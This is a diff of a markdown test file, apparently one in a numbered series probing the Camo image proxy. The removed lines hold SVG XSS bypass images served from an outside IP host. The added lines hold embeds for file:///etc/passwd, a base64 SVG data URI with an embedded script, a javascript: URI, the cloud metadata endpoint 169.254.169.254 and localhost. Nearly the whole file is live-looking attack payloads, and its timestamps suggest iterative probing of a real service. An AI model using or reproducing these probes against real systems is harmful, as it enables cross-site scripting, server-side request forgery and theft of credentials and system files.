@@ -1,33 +1,29 @@
-# SVG Bypass Tests v67
+# URL Scheme Tests v68
 
-Testing various SVG XSS bypass techniques.
+Testing various URL schemes to see what Camo accepts.
 
-## 1. SVG Bare (no XML declaration)
+## 1. file:// protocol
 
-![SVGBare](http://164.90.187.218.nip.io:9999/svgbare?v=67)
+![FileProto](file:///etc/passwd)
 
-## 2. SVG with CDATA sections
+## 2. data: URI
 
-![SVGCDATA](http://164.90.187.218.nip.io:9999/svgcdata?v=67)
+![DataURI](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4=)
 
-## 3. SVG as application/xml content-type
+## 3. javascript: URI (if somehow rendered)
 
-![SVGXML](http://164.90.187.218.nip.io:9999/svgxml?v=67)
+![JSUri](javascript:alert(1))
 
-## 4. SVG with animation event handlers
+## 4. Internal IP direct
 
-![SVGAnim](http://164.90.187.218.nip.io:9999/svganim?v=67)
+![Internal](http://169.254.169.254/latest/meta-data/)
 
-## 5. SVG with UTF-7 charset
+## 5. Localhost direct
 
-![SVGCharset](http://164.90.187.218.nip.io:9999/svgcharset?v=67)
+![Localhost](http://127.0.0.1/)
 
-## 6. SVG with XSLT transform
+## 6. Control
 
-![SVGXSLT](http://164.90.187.218.nip.io:9999/svgxslt?v=67)
+![OK](http://164.90.187.218.nip.io:9999/ok?v=68)
 
-## 7. Control (Valid GIF)
-
-![OK](http://164.90.187.218.nip.io:9999/ok?v=67)
-
-Timestamp: 2026-01-12T15:50:00Z
+Timestamp: 2026-01-12T16:00:00Z
